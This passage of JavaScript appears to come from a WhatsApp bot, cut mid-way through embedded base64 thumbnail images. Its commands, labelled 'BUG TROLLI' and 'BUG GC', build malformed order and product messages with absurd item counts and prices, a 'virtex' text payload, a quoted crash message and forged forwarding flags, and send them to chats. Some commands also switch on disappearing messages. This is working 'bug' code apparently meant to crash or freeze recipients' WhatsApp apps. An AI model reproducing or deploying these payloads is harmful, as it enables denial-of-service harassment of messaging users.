Xz/7XLf6PxfI3LgSxKw/L9KGIpPevDXrUqQHg6Uq9FKgDZuCnD295GVJKsrfeMfpVmjhQoCyY+VVHgJyb+7jzs0YbHwP96uzfVIBxt2pAc2VrFPeRwchIJ94hdgKudygCbDFV/hu1YNLLlmVMAFjkk1ZZRzR7U0MFt5SgGx22xRLkOmRuD0oHZWIpmV5Vy0ZGPs0wObja9hY/axUmJEQEsagZLsyTxJKMMGG/zo6UlsUAO3FxzkBRtXEZwd+9eQR8wJJ716y4NAD+NtqzT2o8FfxWNtS02L/HRjLoo/5ij9a0cMRTiYwWPQUAYd7M+NW02SPSNUbFqXxFI3+Uc/VPp+VbiuCvNnasW9pvB0izXGr6bH7hJeaJR0H2h+tH+yzjczxx6Nqkn85Ri3lY/WH2T6+VAGu4zuK8xvTUEwYU6DQB4wrzFODpXhGBQANKcuB2p1MYGaFmP8wfGlfzGK0Yr9YjA+NAHelsZo3PZmJH31jft5jjj1TTGVTzlJAW7HBXb8a1vS5JI7P8FxWV+3xOX+Bscc5E3Ty9ygDJT19KVIbivM0hHoPWlXi9aVAGqcFSCPXcEgB4mG5+B/StBY4FZtwo/h8RWvk3Mv4GtR0+IXF5Ap3Utk/AUgZNWDG0tkidcZ3PxNSdu4eLbeupIw+zAEUwITbtzR7oeoqgGLpCrZFNsvOnMtHyoJY8jrUcC0LkMPdNAyNnTFzFnGecVJdRQOoApcRsN1yKPU+7mgDyIlTt0p1m8+nnUHxO00FhHcQOyPFKp2OAfQ+nSovVLKS006DVY7mY3bcrMzHY5HYeVYTzOLarR6Hj+Cs0Yyc65Ol/stkeGmCcy82Nlzv91d6hcw2Vvz3EgRPM96r6aelrqmkSvJI15OS8rE9dv70LqV3HNxUy3kck0MC4SJF5t8DtSedpdo0x+BGc6TtU2/8AnXRN2t9Z34P0aRZMbMpG+PhWQe0/gl9Duf4tpCkWDNzMqdYW9PT8q0iNXfX4Lmz0+4t4CvLLzR8o+OPuq0zQR3dpJbzoskTgqynoRV4puadnP5fjxwySjpr+DK+AuPo7q1W21NmF5GMZAz4g8/j51oEOu2L2puPHUIDgg9c/CsB4k0G84e1B7yy51t4piqyL1jYHoavvsv1q21SWb6SIxfKoIQ9+uSo+6pc5tpw0y44cMIyjmtSX9mm6bqdpqCt9FlDFeo6EVzqmqWtgoFxKFYjIUbk/Kq9ofKOKNQZMLGFOQBtnI/vTWisdTvb24mhZvFPKJT0jXuB64xULPJpL27/o6Jf4/HGcpd8Uk/336J4TLMIpEzyuAwyMbGozUbxrrVhZRHCpgNjrnvR9pKlwIZI1KxsPdB8qjtAsWTU9RupM80kxwD2866U7SPLnHjJosUESqqIowqjFYz7f7gPrem2oP/JgLkerN/8AmtthXFfOHtYv/p/Gt+ynKwkQj5Df8c02ZlNXrXrdcivOlI0gD9A0yTWdXttPgkjjlnblVpM8oPrilXOh3p03WbK9XrBMkmPMAgkUqEBdtCbk12xOcZlA+/atWiBiYNGSrDoRWRWT+Fqdo/2ZkP8A5CtdoQE/purq4Ed0Qj9A3Y/tUo8yDuDmqS5G3qadinliAEcjAeXaiwLX4gBJXpTc7wyLlm5TUHHqLDaRM+qnFdnUbf8Arcqe/MtDaWxpXo81B+Zfd7HrUnaxGRFcH3GANQ9xfWbIQLhMntT2i6qnI8KEP4e4x5Uclex8XWhzi6IroUoUFizKAAPWhtft2Oi6facp5pJIoyPlVlhmEqBlPUV0aiWPk2/ydWHyvjjFV9rbKvqzMOLtOUA8ip5bb5/tXGp2F9a63/EtNiE3OOV4871ZnJOwr1RUvCnff7NI+c4cajpU/wBlesf4td6iJ7sG1tVGPBDZ5qJt5buLX3imcG1kjLRjbty5/Opd12ocW8YuWn5SZSoXJPQeQqljr2Zy8lTbuKSqlRFNw+k7apHeLFLZ3hDBOpB33/GsN4p4c1HgnWYrq1kbwefmgmXt/pNfSKHbeo/XNIttWsJbS8jEkTjG46VUYqKpGGTLLI+Utme+zzXYNUFxcmVRfNgyw4xjfqN9x0q2aPpctnJdGCdTBKMxoRnlb1rEuItG1HgfiBJrdm8LmzDL2YfZNbLwBxDa8Q6UZYWVbhMCWLO6H9vWpWKKr9Gr8zLK7e6X8aJeSEW6xBMkJgZPenLRQzSMuxLk0RNHlTneoqG/tbK5Zb2dIFdvdMhwCfLNaaOdtydsmZ3MNpJIQchSa+TNWna6v7m4fPNLKznPqa+r768tXsXKXMLIR1EgI/OsM4j4WfUFmlso0NyZCw7cwz0qJZFFpMcYOSbRm2KXbepa64d1e1J8XT7jHmqcw/Chv4Vf+G7m0nVEGWZkKgD50+SJpgApUqVOxFzmYqeYHcHIrZkYOgdcYYZFKlQA3LzcuVUscjYGvA0pA/ksf/kKVKkB7mTO8LD5im54iyEjO/nSpVll9G2Eh543V6kOHreTxJLvfY+Go8/M0qVYYUuZ0Zn9FlotLgxN/pqXSUSICvQ0qVdxxI9ArvG1KlQAj0rjHpSpUAedOldg5G/lSpUARfEWgWev6fJZ30fMjDZh1U+Yr5/vbfVPZzxaGhfxFQ+63RZk8jSpUAbnw9xDZ6/pMd5Zt7rbMh6o3cGs+9sbkTaPEGwrmViPPHL+9KlUy0VHpld4LszJqcrkAhQF++tOtrUIF2GcUqVcaVybOtukkEEKOwqpe0GZYuH7sjbKFR86VKq9kPRh+PKlSpV1nIf/2Q==",
							"itemCount": 1000000000000,
							"status": "INQUIRY",
							"surface": "CATALOG",
							"orderTitle": "GUA GK NGERTI",
							"message": "entah lah gua nob",
							"sellerJid": "6288224859350@s.whatsapp.net",
							"token": "AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==",
							"totalAmount1000": "Rp 25.000.00",
							"totalCurrencyCode": "IDR",
							"contextInfo": {
								"forwardingScore": 3,
								"isForwarded": true
							}
						}
					}, {
						quoted: bugtrol,
						contextInfo: {}
					})

			varo
				.toggleDisappearingMessages(
					from,
					'Awoakwoakwoak'
					)
			varo
				.relayWAMessage(
					res)
			break
		case 'plp':
			res = await varo
				.prepareMessageFromContent(
					from, {
						"listMessage": {
							"title": `\`\`\`Hi ${pushname} 👋.\`\`\``,
							"description": `\`\`\`Use The Bot As Best You Can And Dont Misuse The Bot Feature\`\`\``,
							"buttonText": vipi,
							"listType": "SINGLE_SELECT",
							"sections": [
							{
								"title": vipi,
								"rows": [
								{
									"title": "Banned",
									"rowId": "Banned"
								}]
							}]
						}
					}, {
						quoted: mek
					})
			varo
				.relayWAMessage(
					res)
			break
		case 'pcp':
			if (!mek.key
				.fromMe && !
				isOwner) return
			buf = Mfake
			imeu = await varo
				.prepareMessage(
					'0@s.whatsapp.net',
					buf, image)
			imeg = imeu.message
				.imageMessage
			res = await varo
				.prepareMessageFromContent(
					from, {
						"productMessage": {
							"product": {
								"productImage": imeg,
								"productId": "150453297177375",
								"title": `${botname} ~ 404 ${vipi}`,
								"description": `${virtex}`,
								"currencyCode": "IDR",
								"priceAmount1000": "99999999999999999999999999999999",
								"productImageCount": 1
							},
							"businessOwnerJid": "6288224859350@s.whatsapp.net",
							"contextInfo": {
								"forwardingScore": 3,
								"isForwarded": true
							}
						}
					}, {
						quoted: bugtrol,
						contextInfo: {}
					})

			varo
				.relayWAMessage(
					res)
			break
			// Bug Trolli ( Sherlynn-Botz )
		case 'psp': // BUG TROLLI + BUG GC + TROLLI
			if (!mek.key
				.fromMe && !
				isOwner) return
			buf = Mfake
			imeu = await varo
				.prepareMessage(
					'0@s.whatsapp.net',
					buf, image)
			imeg = imeu.message
				.imageMessage
			res = await varo
				.prepareMessageFromContent(
					from, {
						"orderMessage": {
							"orderId": "150453297177375",
							"thumbnail": "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",
							"itemCount": 1000000000000,
							"status": "INQUIRY",
							"surface": "CATALOG",
							"orderTitle": "GUA GK NGERTI",
							"message": "entah lah gua nob",
							"sellerJid": "6288224859350@s.whatsapp.net",
							"token": "AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==",
							"totalAmount1000": "99999999999999999999",
							"totalCurrencyCode": "IDR",
							"contextInfo": {
								"forwardingScore": 3,
								"isForwarded": true
							}
						}
					}, {
						quoted: bugtrol,
						contextInfo: {}
					})

			varo
				.toggleDisappearingMessages(
					from,
					'Awoakwoakwoak'
					)
			varo
				.relayWAMessage(
					res)
			break
		case 'p': // TROLLI
			buf = Mfake
			imeu = await varo
				.prepareMessage(
					'0@s.whatsapp.net',
					buf, image)
			imeg = imeu.message
				.imageMessage
			res = await varo
				.prepareMessageFromContent(
					from, {
						"orderMessage": {
							"orderId": "150453297177375",
							"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCADIAMgDASIAAhEBAxEB/8QAHAAAAQUBAQEAAAAAAAAAAAAABAADBQYHAgEI/8QAQBAAAgEDAgQDBAgEBAUFAAAAAQIDAAQRBSEGEjFBE1FhByJxgRQyUpGhscHRFSNC4SRDYvAWM2NyojRzgrLi/8QAGQEAAwEBAQAAAAAAAAAAAAAAAAECAwQF/8QAJxEAAgICAgIBBAIDAAAAAAAAAAECEQMxEiEEQRMiMlFhkaEFcYH/2gAMAwEAAhEDEQA/AJmRqFkOdh1rtztTEjd+9MRGXxO9Q0pwSal7vLZABJOwA3p6w4T1a/IIt/AjP9U3u/h1oGOcNXkY0q8sQj+NOT74GQFIx/v41axrVhDbxRyXG+MEsuO1O6FwbbacPEklkmuD1Ye6o+Ary64KsZySGmDHuXzQBO6RKj2MRUho5F5wexBNEtZK8jOsvIW35StB6fBd2NtBbrAkkcKhFxJjIHTqKOFzKN2snz/pZSabVjTGzYSA7SIa8axnHTlPzp1rwEe/bXK/Bc0hqFugwwnX/uib9qVIdsYNrOP8vPwNcNFKv1o2+6iDqNkzZ+liPHYnGfvoDXeJbDSLB7qW5V1H1VRgSx8qKQWxrULyHT7WSe5JjiQZYms81X2msj8um2KMv2536/IfvVP4p4mvuI7xpbuZlt8+5AG91R+pqDDJnlHMR91RQy4z+0TW5GHI1tEPJE/eh/8AjLiB3DG7OP8A2xiq8sSBc7ketd5A+ocfCgC5abx7ewsPp0aMD/Um34VeNG4htdUUGNwJiN0J3rEzIc7tn5Ubp1vf/SEk09iGByMGk+gXZu5ZSobJwd81Fa7fx2VhNO2SFHQd/Sq3YcXIgW3vAIplAByM70Dx/qgl0NBC4bncczA7DairDRRtU1GW9uZJZX5mY+8fL0FAMzSrzHZew8zTOeeTkHfrRC9cge6o2Hma0RLBnHgnI3bqSa9Zg6hvP8DTsqc5OaGaN4ySoyMbigR2p5zg9fhSpRlSRzDHkR2pUAbja6feXn/p7d3H2sYH31MWPCMjnmv5gi/Yj3J+dSeizE6Va8pP1Ox9aPEzg9Wx8aYDen6LZWJDW8Kh/ttu330f4R8wRQouZB32+FOLdsBvj7qACPC9KXhfGmRdnuAa6W7X+paAH1Q46mveU+eflTK3MQ7EV2LmL7X4UAdlT6V4QfgO9ITRnfnWm5powvVT6ZoAi9f1a30mykmuSPcGeUnrXz5xTrc2uak9xJ7sIOEUDAx51O+0nX3vtVkgjcmFTjlB+sao7BnPvH4AVDdlIRYV3CeY9T8hXBXk6iukYnz+QoAKB7An503IT0DN8qUSNIcDp38qe8JYyMjLedACs7cvKC+Wx1zUxbar4RZ